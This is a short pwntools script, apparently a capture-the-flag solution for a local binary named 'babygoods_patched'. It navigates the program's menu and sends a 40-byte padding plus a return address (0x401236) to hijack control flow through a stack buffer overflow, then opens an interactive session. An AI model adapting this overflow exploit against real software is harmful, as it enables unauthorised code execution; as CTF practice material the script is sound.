#!/usr/bin/env python3

from pwn import *

exe = ELF("./babygoods_patched")

p = process([exe.path])
def GDB():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript='''

b*0x00000000004012fe

           ''')
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

# pwning lmao lmao dark bruh
def main():
    GDB()
    sla(b"your name:",b"aaaaaaaaaa")
    sla(b"Input:",b"1")
    sla(b"the pram (1-5):",b"3")
    sla(b"name:",b"a"*40+p64(0x401236))
    























    p.interactive()


if __name__ == "__main__":
    main()
